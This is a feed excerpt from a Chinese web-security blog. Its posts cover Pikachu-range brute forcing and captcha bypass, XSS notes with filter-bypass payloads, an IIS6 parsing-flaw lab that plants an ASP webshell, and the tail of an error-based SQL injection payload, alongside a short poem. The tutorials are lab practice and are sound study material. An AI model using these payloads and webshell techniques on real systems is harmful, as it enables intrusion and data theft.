count(*),concat(database(),floor(rand(0)*2))x from information_schema.tables group by x)a )#</span><br></pre></td></tr></table></figure></p><p>关于floor报错原理分析请参考此篇文章:<br><a href="http://blog.51cto.com/chichu/2051375" target="_blank" rel="noopener">http://blog.51cto.com/chichu/2051375</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;blockquote class=&quot;blockquote-center&quot;&gt;人生舞台的大幕随时都可能拉开，关键是你愿意表演，还是选择躲避。&lt;/blockquote&gt;&lt;/p&gt;
&lt;div align=&quot;middle&quot;&gt;&lt;iframe frameborder=&quot;no&quot; borde
      
    
    </summary>
    
      <category term="WEB安全" scheme="https://louisnie.github.io/categories/WEB%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="靶机实验" scheme="https://louisnie.github.io/tags/%E9%9D%B6%E6%9C%BA%E5%AE%9E%E9%AA%8C/"/>
    
  </entry>
  
  <entry>
    <title>pikachu靶机实战之暴力破解</title>
    <link href="https://louisnie.github.io/2019/01/02/pikachu%E9%9D%B6%E6%9C%BA%E5%AE%9E%E6%88%98%E4%B9%8B%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/"/>
    <id>https://louisnie.github.io/2019/01/02/pikachu靶机实战之暴力破解/</id>
    <published>2019-01-02T14:38:28.000Z</published>
    <updated>2019-01-02T17:07:40.573Z</updated>
    
    <content type="html"><![CDATA[<p><blockquote class="blockquote-center">态度决定高度!</blockquote></p><div align="middle"><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=5181411&auto=0&height=66"></iframe></div><h2 id="靶机简介"><a href="#靶机简介" class="headerlink" title="靶机简介"></a>靶机简介</h2><p><strong>Pikachu是一个带有漏洞的Web应用系统，在这里包含了常见的web安全漏洞。 是个适合新手练习的靶场</strong><br>Pikachu上的漏洞类型列表如下：<br>Burt Force(暴力破解漏洞)<br>XSS(跨站脚本漏洞)<br>CSRF(跨站请求伪造)<br>SQL-Inject(SQL注入漏洞)<br>RCE(远程命令/代码执行)<br>Files Inclusion(文件包含漏洞)<br>Unsafe file downloads(不安全的文件下载)<br>Unsafe file uploads(不安全的文件上传)<br>Over Permisson(越权漏洞)<br>../../../(目录遍历)<br>I can see your ABC(敏感信息泄露)<br>PHP反序列化漏洞<br>XXE(XML External Entity attack)<br>不安全的URL重定向<br>SSRF(Server-Side Request Forgery)<br>More…(找找看?..有彩蛋!)<br>管理工具里面提供了一个简易的xss管理后台,供你测试钓鱼和捞cookie~</p><h2 id="安装和使用"><a href="#安装和使用" class="headerlink" title="安装和使用"></a>安装和使用</h2><p>Pikachu使用世界上最好的语言PHP进行开发-_-，数据库使用的是mysql，因此运行Pikachu你需要提前安装好”PHP+MYSQL+中间件（如apache,nginx等）”的基础环境，建议在你的测试环境直接使用 一些集成软件来搭建这些基础环境,比如XAMPP,WAMP等,作为一个搞安全的人,这些东西对你来说应该不是什么难事。接下来:<br>–&gt;把下载下来的pikachu文件夹放到web服务器根目录下;<br>–&gt;根据实际情况修改inc/config.inc.php里面的数据库连接配置;<br>–&gt;访问 <a href="http://x.x.x.x/pikachu" target="_blank" rel="noopener">http://x.x.x.x/pikachu</a> ,会有一个红色的热情提示”欢迎使用,pikachu还没有初始化，点击进行初始化安装!”,点击即可完成安装。</p><h2 id="暴力破解实验"><a href="#暴力破解实验" class="headerlink" title="暴力破解实验"></a>暴力破解实验</h2><h2 id="Burte-Force（暴力破解）概述"><a href="#Burte-Force（暴力破解）概述" class="headerlink" title="Burte Force（暴力破解）概述"></a>Burte Force（暴力破解）概述</h2><blockquote><p>暴力破解”是一攻击具手段，在web攻击中，一般会使用这种手段对应用系统的认证信息进行获取。 其过程就是使用大量的认证信息在认证接口进行尝试登录，直到得到正确的结果。 为了提高效率，暴力破解一般会使用带有字典的工具来进行自动化操作。<br>理论上来说，大多数系统都是可以被暴力破解的，只要攻击者有足够强大的计算能力和时间，所以断定一个系统是否存在暴力破解漏洞，其条件也不是绝对的。 我们说一个web应用系统存在暴力破解漏洞，一般是指该web应用系统没有采用或者采用了比较弱的认证安全策略，导致其被暴力破解的“可能性”变的比较高。 这里的认证安全策略, 包括：<br>1.是否要求用户设置复杂的密码；<br>2.是否每次认证都使用安全的验证码（想想你买火车票时输的验证码～）或者手机otp；<br>3.是否对尝试登录的行为进行判断和限制（如：连续5次错误登录，进行账号锁定或IP地址锁定等）；<br>4.是否采用了双因素认证；<br>…等等。</p></blockquote><h3 id="基于表单的暴力破解"><a href="#基于表单的暴力破解" class="headerlink" title="基于表单的暴力破解"></a>基于表单的暴力破解</h3><p>我们使用burpsuite进行暴力破解,由于前端没有验证码等防范暴力破解的措施,我们直接输入用户名密码,发送到burpsuite的intruder模块,一般用户名为admin,administrator(Windows环境)或者root(Linux环境),我设置admin为用户名,对其密码进行爆破<br><img src="https://wx2.sinaimg.cn/large/0078beR7ly1fysptku9v3j30yx0erdgt.jpg" alt="image"><br><img src="https://ws3.sinaimg.cn/large/0078beR7ly1fyspu685cvj30h707ewen.jpg" alt="image"><br><img src="https://ws3.sinaimg.cn/large/0078beR7ly1fyspuumb95j30ki0c20tb.jpg" alt="image"></p><h3 id="不安全的验证码-on-client常见问题"><a href="#不安全的验证码-on-client常见问题" class="headerlink" title="不安全的验证码-on client常见问题"></a>不安全的验证码-on client常见问题</h3><h4 id="验证码作用"><a href="#验证码作用" class="headerlink" title="验证码作用:"></a>验证码作用:</h4><p>1,防止暴力破解<br>2,防止机器恶意注册</p><h4 id="验证码的认证流程"><a href="#验证码的认证流程" class="headerlink" title="验证码的认证流程:"></a>验证码的认证流程:</h4><p>客户端request登录页面,后台生成验证码<br>1,后台使用算法生成图片,并将图片response给客户端<br>2,同时将算法生成的值全局赋值存到session中.</p><h4 id="校验验证码"><a href="#校验验证码" class="headerlink" title="校验验证码:"></a>校验验证码:</h4><p>1,客户端将认证信息和验证码一同提交<br>2,后台对提交的验证码和session里面的进行比较</p><p>客户端重新刷新页面,再次生出新的验证码<br>验证码算法中一般包含随机函数,所以每次刷新都会改变</p><h4 id="不安全的客户端验证码常见问题"><a href="#不安全的客户端验证码常见问题" class="headerlink" title="不安全的客户端验证码常见问题:"></a>不安全的客户端验证码常见问题:</h4><p>1,使用前端js实现验证码(纸老虎)<br>2,将验证码在cookie中泄露,容易被获取<br>3,将验证码在前端源代码中泄露,容易被获取</p><h4 id="开始试验"><a href="#开始试验" class="headerlink" title="开始试验:"></a>开始试验:</h4><p>首先尝试输入错误的用户名,密码+错误的验证码,点击登录页面返回验证码不正确<br>然后输入错误的用户名,密码+正确的验证码,点击登录页面返回用户名或者密码不正确<br>当输入错误的用户名,密码+空验证码,点击登录页面提示验证码不能为空,表示服务端对验证码的有效性做过校验,一切逻辑正常<br>当查看源代码的时候发现是前台生出的验证码<br><img src="https://ws2.sinaimg.cn/large/0078beR7ly1fyspzfud27j31g40jxdi7.jpg" alt="image"><br>如果后台不对前台输入的验证码进行校验的话,那么通过burp代理(客户端和服务端中间人)即可绕过验证码<br>我们使用burp抓包看看是否对输入的验证码进行校验,结果是用户名或者密码不存在<br><img src="https://ws4.sinaimg.cn/large/0078beR7ly1fysq0e8w59j30yz0f9wft.jpg" alt="image"><br>然后换个账号密码继续发包,判断服务器端是否对用户前端输入的验证码进行校验<br><img src="https://wx1.sinaimg.cn/large/0078beR7ly1fysq1dpfgtj30yb0ecgn2.jpg" alt="image"><br>还是用户名密码不正确,但并未返回验证码不正确</p><p>我们都知道当用户输入账号密码和验证码之后,服务器端首先验证验证码是否正确,如果不正确直接返回验证码不正确,如果验证码正确,那么服务器端会接着验证用户名密码是否正确.我们刚刚的结果是用户名或者密码不存在,表示验证码验证那一关我们是完美的避过了,然后再爆破用户名密码即可<br>爆破出用户名为:<br>admin/123456<br>pikachu/000000<br>test/abc123</p><h3 id="不安全的验证码-on-server常见问题"><a href="#不安全的验证码-on-server常见问题" class="headerlink" title="不安全的验证码-on server常见问题"></a>不安全的验证码-on server常见问题</h3><h4 id="不安全的验证码-on-server常见问题-1"><a href="#不安全的验证码-on-server常见问题-1" class="headerlink" title="不安全的验证码-on server常见问题"></a>不安全的验证码-on server常见问题</h4><p>1,验证码在后台不过期,导致可以长期被使用<br>2,验证码校验不严格,逻辑出现问题<br>3,验证码设计的太过简单和有规律,容易被猜解</p><p>针对于第一个验证码在后台不过期的漏洞,开始实验<br>首先尝试输入错误的用户名,密码+错误的验证码,点击登录burp抓返回包页面返回验证码不正确<br>然后输入错误的用户名,密码+正确的验证码,点击登录burp抓返回包页面返回用户名或者密码不正确<br>当输入错误的用户名,密码+空验证码,点击登录burp抓返回包页面提示验证码不能为空,表示服务端对验证码的有效性做过校验,一切逻辑正常</p><p>当刷新页面,客户端向服务器发出请求,生出新的验证码,同时后台会在session中将这个验证码存下来(存下来的目的是为了对用户输入的验证码进行验证),所以当输入错误的验证码或者空的验证码的时候都会提示验证码错误,只有正确的验证码才可以被服务器接受</p><p>但是如果这个验证码在后台不过期或者过期时间较长,足够我们去爆破用户名密码,那么漏洞就产生了.<br>1,首先先正常提交用户名密码验证码,然后发送到repeater模块中<br>2,关闭burp代理功能,刷新页面,会生出新的验证码,记住新的验证码<br><img src="https://wx4.sinaimg.cn/large/0078beR7ly1fysq86aafsj30mp0cfmxu.jpg" alt="image"><br>3,在repeater模块中将新的验证码写入,重放发现其提示是用户名密码错误<br><img src="https://wx1.sinaimg.cn/large/0078beR7ly1fysq9fdt4xj30vb0cudgt.jpg" alt="image"><br>4,将账户名密码替换,试试验证码还有没有效<br><img src="https://ws3.sinaimg.cn/large/0078beR7ly1fysqa9u7bxj30w50dq0ts.jpg" alt="image"><br>5,因为无论怎么替换用户名和密码,验证码都正确,所以那么这一关我们是完美的避过了,然后再爆破用户名密码即可</p><h4 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析:"></a>漏洞分析:</h4><p>其漏洞根本在于服务器端未设定生出验证码的session的过期时间,那么按照PHP语言默认session的过期时间为24分钟,这个验证码24分钟内都是有效的,那么也足够黑客进行暴力破解啦</p><h4 id="修复方法"><a href="#修复方法" class="headerlink" title="修复方法:"></a>修复方法:</h4><p>法一,在php.ini配置文件中设置过期时间<br>法二,在代码中设定该验证码验证过一次之后,就将其session进行销毁(更有效)</p><h2 id="token防止暴力破解"><a href="#token防止暴力破解" class="headerlink" title="token防止暴力破解?"></a>token防止暴力破解?</h2><p>曾经网上有人说可以使用token防止暴力破解,其原理就是当用户打开页面时,后端生出一个token值,token会被存放到session中去,同时服务端会将token发送到前端的表单中,当用户输入账号密码点击确认的时候,客户端会将账号密码+token一起发送到服务器端,当刷新页面之后,token即就会变化</p><p>但是token会被显示在前端的表单中,黑客完全可以通过代码获取表单的token,然后配合暴力破解即可<br><img src="https://ws3.sinaimg.cn/large/0078beR7ly1fysqimk67fj310j0idmy3.jpg" alt="image"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;blockquote class=&quot;blockquote-center&quot;&gt;态度决定高度!&lt;/blockquote&gt;&lt;/p&gt;
&lt;div align=&quot;middle&quot;&gt;&lt;iframe frameborder=&quot;no&quot; border=&quot;0&quot; marginwidth=&quot;0&quot; ma
      
    
    </summary>
    
      <category term="WEB安全" scheme="https://louisnie.github.io/categories/WEB%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="靶机实验" scheme="https://louisnie.github.io/tags/%E9%9D%B6%E6%9C%BA%E5%AE%9E%E9%AA%8C/"/>
    
  </entry>
  
  <entry>
    <title>XSS攻击学习笔记</title>
    <link href="https://louisnie.github.io/2018/11/19/xss/"/>
    <id>https://louisnie.github.io/2018/11/19/xss/</id>
    <published>2018-11-19T15:39:28.000Z</published>
    <updated>2019-01-07T17:15:16.717Z</updated>
    
    <content type="html"><![CDATA[<p><blockquote class="blockquote-center">疲惫生活中的英雄梦想!</blockquote></p><div align="middle"><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=526668900&auto=1&height=66"></iframe></div><h2 id="XSS攻击"><a href="#XSS攻击" class="headerlink" title="XSS攻击"></a>XSS攻击</h2><p>xss攻击(跨站脚本攻击的简称)是指攻击者利用网站程序对用户输入过滤不足的缺陷,输入可以显示在界面上对其他用户造成影响的HTML代码,从而盗取用户资料,利用用户身份进行某种动作或者访问者进行病毒侵害的一种攻击方式.其英文全称为Cross site Scripting,原本缩写应当是CSS,但为了和层叠样式表(CSS)有所区分,通常将其缩写为XSS.</p><h3 id="XSS攻击的原理"><a href="#XSS攻击的原理" class="headerlink" title="XSS攻击的原理:"></a>XSS攻击的原理:</h3><p>跨站脚本攻击本质上是将一种恶意代码嵌入到当前网页中并执行的攻击方式.通常情况下,黑客通过”HTML注入”行为篡改网页,并插入恶意JavaScript脚本,从而在用户浏览网页的时候控制浏览器的行为.这种漏洞产生的主要原因是网站对于用户提交的数据过滤不严格,导致用户提交的数据可以修改当前页面或者插入一段脚本.</p><h3 id="XSS攻击风险的功能点"><a href="#XSS攻击风险的功能点" class="headerlink" title="XSS攻击风险的功能点:"></a>XSS攻击风险的功能点:</h3><h4 id="评价功能"><a href="#评价功能" class="headerlink" title="评价功能:"></a>评价功能:</h4><p>用户输入评价(评价处为攻击代码)–服务器接收到评论并存储(存储到数据库中)–前台自动调用评论–任何人触发评论(即看到攻击代码便表示已触发漏洞)–攻击成功</p><h4 id="论坛私信功能"><a href="#论坛私信功能" class="headerlink" title="论坛私信功能:"></a>论坛私信功能:</h4><p>用户发送私信(私信内夹带攻击代码)–服务器接受私信并存储(存储到数据库中)–收信用户打开私信(展示攻击代码)–攻击成功</p><h2 id="XSS攻击分类"><a href="#XSS攻击分类" class="headerlink" title="XSS攻击分类:"></a>XSS攻击分类:</h2><p>XSS攻击通常在用户访问目标网站时或者之后进行某项动作时触发并执行.根据攻击代码的存在地点及是否被服务器存储,并且根据XSS攻击存在的形式及产生的效果,可以将其分为以下三类:<br>(1) 反射型跨站攻击:涉及浏览器–服务器交互<br>(2) 存储型跨站攻击:涉及浏览器–服务器–数据库交互<br>(3) DOM型跨站攻击:涉及浏览器–服务器交互<br>目前,可直接产生大范围危害的是存储型跨站攻击.攻击者可利用JS脚本编写各类型攻击,实现偷取用户cookie,进行内外探测,弹出广告的行为.攻击者构造的JS脚本会被存储型跨站漏洞直接存储到数据库中,一旦有人访问含有XSS漏洞的页面,则攻击者插入的JS脚本生效,攻击成功.</p><h3 id="反射型XSS"><a href="#反射型XSS" class="headerlink" title="反射型XSS"></a>反射型XSS</h3><p>存在反射型XSS漏洞的页面只是将用户输入的数据通过URL的形式直接或未经过完善的安全过滤就在浏览器中进行输出,会导致输出的数据中存在可被浏览器执行的代码数据.由于此种类型的跨站代码存在于URL中,因此黑客通常需要通过诱骗或加密变形等方式,将存在而已代码的链接发给用户,只有用户点击以后才能使攻击成功实施.</p><h3 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h3><p>存储型XSS脚本攻击是指web应用程序将用户输入的数据信息保存在服务端的数据库或其他文件形式中,网页进行数据查询展示时,会从数据库中获取数据内容,并将数据内容在网页中进行输出展示.只要用户访问具有XSS攻击脚本的网页时,就会触发攻击效果,因此存储型XSS具有较强的稳定性.<br>存储型XSS脚本攻击最为常见的场景就是在博客或新闻发布系统中,黑客将包含恶意代码的数据信息直接写入文章或文章评论中,所有浏览文章或评论的用户就会被黑客在他们的客户端浏览器环境中执行插入的恶意代码.</p><h3 id="基于DOM的XSS"><a href="#基于DOM的XSS" class="headerlink" title="基于DOM的XSS"></a>基于DOM的XSS</h3><p>利用JavaScript的DOM节点编程可以改变HTML代码代码这个特性而形成的XSS攻击.基于DOM的XSS攻击往往需要针对具体的JavaScript DOM代码进行分析,并根据实际情况进行XSS攻击的利用.但实际应用中,由于构造语句具有较大的难度,且实现效果及要求较为苛刻,因此较为少见.</p><h2 id="XSS攻击的条件"><a href="#XSS攻击的条件" class="headerlink" title="XSS攻击的条件"></a>XSS攻击的条件</h2><p>XSS漏洞的利用过程较为直接.反射型/DOM型跨站攻击均可以理解为:服务器收到数据,并原样返回给用户,整个过程中web应用并没有自身的存储过程(存入数据库).这就导致了攻击无法持久化,仅针对当前请求有效,也就无法直接攻击到其他用户.当然,这两类攻击也可以利用钓鱼,垃圾邮件等手段产生攻击其他用户的效果.</p><p>作为攻击者,如果要利用存储型跨站漏洞,则先要将攻击脚本存储在服务器端,并且保证攻击脚本在读取后可顺利执行.当应用功能对上述条件都满足时,才可保证漏洞被成功利用.</p><p>作为防护者,从防护角度来看,可以选择禁止攻击脚本存储在数据库,即在入库之前做处理;或者对攻击脚本进行转义,避免出库时顺利执行.满足以上两种条件的任何一个即可实现有效的防护.</p><h2 id="基本测试流程"><a href="#基本测试流程" class="headerlink" title="基本测试流程"></a>基本测试流程</h2><h3 id="寻找注入点"><a href="#寻找注入点" class="headerlink" title="寻找注入点"></a>寻找注入点</h3><p>一般情况下,XSS攻击是通过”HTML注入”方式来实现的.即就是攻击者通过提交参数,意图修改当前页面的HTML结构.XSS成功时,提交的参数格式可在当前页面拼接成可执行脚本.可见,XSS漏洞存在的要求就是:当前页面存在参数显示点,且参数显示点可被用户控制输入.因此,寻找用户端可控的输入点是XSS攻击成功的第一步.</p><p>在一个常规的网站,存储型XSS一般发生在留言板,在线信箱,评论栏等处,表现特征是用户可自行输入数据,并且数据会提交给服务器.通常可以通过观察页面的交互行为来确定输入点.通常情况下,要求可提交数据量至少在20个字符以上,否则JavaScript脚本很难执行.</p><p>除了直接观察以外,利用web代理工具抓包来查看提交参数也是寻找输入点的一个有效途径.在一些输入点隐蔽或者用户输入被JS脚本限制的页面,可以利用Burpsuite抓包的方式寻找输入点.通过直接抓取HTTP包,观察里面是否含有隐藏参数,并且对隐藏参数在页面进行定位,即可找到输入点位置.</p><h3 id="测试输出位置"><a href="#测试输出位置" class="headerlink" title="测试输出位置"></a>测试输出位置</h3><p>测试主要基于两个目的:<br>(1) 确定网站对输入内容是否进行了输出,判断是否可以展开XSS攻击.<br>(2) 有时候需要根据输出的位置的HTML环境编写有效的XSS代码.</p><h3 id="测试基本跨站代码"><a href="#测试基本跨站代码" class="headerlink" title="测试基本跨站代码"></a>测试基本跨站代码</h3><p>测试XSS攻击的经典方式就是”弹窗测试”,即在输入中插入一段可以产生弹窗效果的JavaScript脚本,如果刷新页面产生了弹窗,表名XSS攻击测试脚本.<br>在留言板中插入如下的弹窗测试脚本:<br>    <script>alert(/xss/)</script><br>这段代码的意义是:通过JavaScript执行弹窗命令,弹窗命令为alert,内容为/xss/.<br>点击”提交”按钮,并刷新页面,观察网站,发现出现弹窗,表明测试成功.至此可确认,此功能点存在存储型跨站漏洞.</p><h3 id="XSS进阶测试方法"><a href="#XSS进阶测试方法" class="headerlink" title="XSS进阶测试方法"></a>XSS进阶测试方法</h3><p>以上介绍了基础的漏洞环境,并且没有添加任何安全防护手段.本节以<script>alert(/xss/)</script>语句为例,后台设置了针对<script></script>标签的过滤.当用户传入的参数包含上述两个标签时,会被直接删掉,所以需要学会识别漏洞的防护方式并寻找绕过思路.<br>(1) 闭合标签测试<br>当上述的经典测试代码失效的时候,需要对输出点进一步进行分析,判断输出点周围的标签环境,修改测试代码来达到XSS效果.</p><p>使用浏览器的”查看网页源代码”来分析网页源码,在测试点为”内容”的框内输入”444”,以寻找输出点.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;tr bgcolor=&quot;#ffffff&quot;&gt; </span><br><span class="line"></span><br><span class="line">&lt;td colspan=&quot;2&quot;&gt;内容: &lt;textarea&gt;444&lt;/textarea&gt;&lt;/td&gt;</span><br><span class="line"></span><br><span class="line">&lt;/tr&gt;</span><br></pre></td></tr></table></figure><p>观察代码倒数第二行,发现之前提交的测试内容在一对多行文本框<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;textarea&gt;&lt;/textarea&gt;</span><br></pre></td></tr></table></figure></p><p>由于存在这对标签,导致在该标签中的内容即使出现了JavaScript脚本,也会被浏览器当作文本内容进行显示,并不会执行JavaScript语句.<br>面对这种参数输出在标签内的情况,在构造注入语句时,需要先闭合前面的<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;textarea&gt;</span><br></pre></td></tr></table></figure></p><p>标签,进而使原有的标签内容失效,再构造JavaScript语句,<br>这里使用的测试代码为:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;/textarea&gt;&lt;script&gt;alert(/xss/)&lt;/script&gt;</span><br></pre></td></tr></table></figure></p><p>其中用于闭合参数输出点前面的<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;textarea&gt;</span><br></pre></td></tr></table></figure></p><p>富文本标签.成功闭合标签之后,则后面的script脚本即可执行.而最后的<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;/textarea&gt;</span><br></pre></td></tr></table></figure></p><p>由于没有与其闭合的标签,所以没有任何实际效果.</p><p>(2)大小写混合测试<br>因为JavaScript不区分大小写,我们可以将某个XSS代码使用大小写结合的方式发送给服务器端,可以避过一些黑名单过滤技术.,比如:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;Script&gt;alert(/xss/)&lt;/scRipt&gt;</span><br></pre></td></tr></table></figure><p>(3)多重嵌套测试:<br>当大小写混合的模式行行不通的时候,我们可以尝试使用将两个关键字进行嵌套,让服务器过滤一个多余的关键词,留下的内容会自动拼接成有效词,<br>举个栗子:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;scr&lt;script&gt;ipt&gt;alert(/xss/)&lt;/script&gt;</span><br></pre></td></tr></table></figure></p><p>以上测试代码构建思路为:由于</p><pre><code>&lt;script&gt;</code></pre><p>标签会被自动删除,因此构造攻击代码为</p><pre><code>&lt;scr&lt;script&gt;ipt&gt;</code></pre><p>这样</p><pre><code>&lt;script&gt;</code></pre><p>会被自动删除,留下的</p><pre><code>&lt;scr ipt&gt;</code></pre><p>会自动构成</p><pre><code>&lt;script&gt;</code></pre><p>,这样的手段即为多重嵌套测试.</p><p>(4)多标签测试<br>在测试XSS的过程中,能够触发弹窗效果的远不止</p><pre><code>&lt;script&gt;</code></pre><p>这一种标签.在不同的浏览器,不同的场景,不同的环境下,能够触发攻击效果的跨站代码也不尽相同.<br>可以参加此链接:<a href="https://www.freebuf.com/articles/web/20282.html%5D%28https://www.freebuf.com/articles/web/20282.html" target="_blank" rel="noopener">XSS现代WAF规则探测及绕过技术</a> “”)</p><p>XSS语句的基本特点是利用各类JS脚本特征来设计触发点,攻击代码则利用各类型编码或者外部引用方式进行加载.该链接只是给出了一部分,在实践中千变万化,利用方式也各不相同.</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;blockquote class=&quot;blockquote-center&quot;&gt;疲惫生活中的英雄梦想!&lt;/blockquote&gt;&lt;/p&gt;
&lt;div align=&quot;middle&quot;&gt;&lt;iframe frameborder=&quot;no&quot; border=&quot;0&quot; marginwidth=&quot;0
      
    
    </summary>
    
      <category term="WEB安全" scheme="https://louisnie.github.io/categories/WEB%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="web漏洞,手工挖掘漏洞" scheme="https://louisnie.github.io/tags/web%E6%BC%8F%E6%B4%9E-%E6%89%8B%E5%B7%A5%E6%8C%96%E6%8E%98%E6%BC%8F%E6%B4%9E/"/>
    
  </entry>
  
  <entry>
    <title>凌云志</title>
    <link href="https://louisnie.github.io/2018/11/07/%E5%87%8C%E4%BA%91%E5%BF%97/"/>
    <id>https://louisnie.github.io/2018/11/07/凌云志/</id>
    <published>2018-11-07T15:39:28.000Z</published>
    <updated>2018-11-07T15:53:00.383Z</updated>
    
    <content type="html"><![CDATA[<div align="middle"><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=526668900&auto=1&height=66"></iframe></div><p>雨落惊得杨柳斜，少年蹒跚几经劫。<br>过荆棘如履平地，流血依旧笑欢颜。<br>千难万阻志不灭，惧他风雪万里渊？<br>他日我得凌云志，日晖逊色半边天！</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;div align=&quot;middle&quot;&gt;&lt;iframe frameborder=&quot;no&quot; border=&quot;0&quot; marginwidth=&quot;0&quot; marginheight=&quot;0&quot; width=&quot;330&quot; height=&quot;86&quot; src=&quot;//music.163.com/outcha
      
    
    </summary>
    
      <category term="励志" scheme="https://louisnie.github.io/categories/%E5%8A%B1%E5%BF%97/"/>
    
    
      <category term="励志" scheme="https://louisnie.github.io/tags/%E5%8A%B1%E5%BF%97/"/>
    
  </entry>
  
  <entry>
    <title>IIS6.0容器之解析漏洞复现</title>
    <link href="https://louisnie.github.io/2018/10/30/IIS6.0%E5%AE%B9%E5%99%A8%E4%B9%8B%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    <id>https://louisnie.github.io/2018/10/30/IIS6.0容器之解析漏洞复现/</id>
    <published>2018-10-29T16:15:28.000Z</published>
    <updated>2018-10-30T09:40:21.337Z</updated>
    
    <content type="html"><![CDATA[<p><blockquote class="blockquote-center">态度决定高度!</blockquote></p><div align="middle"><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=5181411&auto=0&height=66"></iframe></div><h1 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a><strong>漏洞简介</strong></h1><p>解析漏洞是指web服务器因对HTTP请求处理不当导致将非可执行的脚本,文件等当作可执行的脚本去执行.该漏洞一般配合web容器(iis,nginx,apache,tomcat等)的文件上传功能去使用,以获取服务器的权限.</p><p><strong>IIS5.X/6.X解析漏洞</strong><br>对于IIS服务器5版本和6版本存在两个解析漏洞,分别为目录解析和文件解析</p><h1 id="目录解析"><a href="#目录解析" class="headerlink" title="目录解析"></a><strong>目录解析</strong></h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介:"></a>简介:</h2><p>在网站下建立文件夹的名称中以.asp或.asa等作为后缀的文件夹,其目录内任何扩展名的文件都被IIS当作asp可执行文件去解析并执行.<br>举个栗子:/xx.asp/xx.jpg为xx.asp目录下存在xx.jpg文件,但将会被IIS解析成asp文件去执行,与原文件的后缀无关.</p><h2 id="实验"><a href="#实验" class="headerlink" title="实验:"></a>实验:</h2><p>我们这里使用墨者学院提供的实验环境去复现该漏洞执行过程.(<a href="https://www.mozhe.cn/bug/detail/Umc0Sm5NMnkzbHM0cFl2UlVRenA1UT09bW96aGUmozhe" target="_blank" rel="noopener">墨者学院解析漏洞链接</a>)</p><p>我们在界面先上传一个普通文件,通过F12控制台查看消息头,得知目标服务器为Microsoft-IIS/6.0,也有需要上传的地方,我们可以试试目录解析漏洞.<br><img src="http://phem9sn6g.bkt.clouddn.com/blog/181030/B4d608dKBf.png" alt="mark"><br>我们先随意上传一个文件,观其url发现是asp脚本构造的页面,然后在本地制作一个asp的一句话木马保存到一个文件中,然后打开burpsuite的代理功能去进行抓包修改<br>我们在发送的POST请求中发现刚刚发送的asp.txt被保存的第二个upload文件下,为了让其执行,所以我们在第二个upload后面加入/webshell.asp文件,这样就能将asp.txt这个一句话木马放入webshell.asp中,便可以利用解析漏洞直接将asp.txt当作asp脚本去执行<br><img src="http://phem9sn6g.bkt.clouddn.com/blog/181030/GlEfEIEbb0.png" alt="mark"><br>在burp中转发浏览器显示成功上传,并列出上传的地址<br><img src="http://phem9sn6g.bkt.clouddn.com/blog/181030/1EkHk9cJ5E.png" alt="mark"><br>成功的将asp一句话木马上传到目标服务器中,这样我们可以使用中国菜刀去远程连接<br><img src="http://phem9sn6g.bkt.clouddn.com/blog/181030/IClbb69ACC.png" alt="mark"><br><img src="http://phem9sn6g.bkt.clouddn.com/blog/181030/5690409fdK.png" alt="mark"></p><h1 id="文件解析-后缀解析"><a href="#文件解析-后缀解析" class="headerlink" title="文件解析/后缀解析"></a><strong>文件解析/后缀解析</strong></h1><h2 id="简介-1"><a href="#简介-1" class="headerlink" title="简介:"></a>简介:</h2><p>在IIS6.0下,分号后面的内容不被解析,举个栗子,xx.asp;.jpg将会当作xx.asp去解析执行.<br>IIS6.0 默认的可执行文件除了.asp，还包含这三种：.asa .cdx .cer.  例如：test.asa 、 test.cdx 、 test.cer</p><h2 id="实验-1"><a href="#实验-1" class="headerlink" title="实验:"></a>实验:</h2><p>继续使用刚刚的环境,我们将刚刚的asp木马文件名修改为webshell.asp;.txt,因为该网站不允许上传以asp作为后缀的文件名,所以我们使用.txt后缀,但分号后面的内容将会被IIS过滤不去解析,所以这就是个asp脚本.<br><img src="http://phem9sn6g.bkt.clouddn.com/blog/181030/CHDgG0BA30.png" alt="mark"><br>我们将文件直接上传到upload目录下,然后使用菜刀连接,也是可以连接上的.<br><a href="https://i.loli.net/2018/10/30/5bd7346bd84d0.png" target="_blank" rel="noopener">https://i.loli.net/2018/10/30/5bd7346bd84d0.png</a><br>当然顺便也能找到所需要的key值<br><img src="http://phem9sn6g.bkt.clouddn.com/blog/181030/b9K2md7c7K.png" alt="mark"></p>]]></content>
    
    <summary type="html">
    
      
      
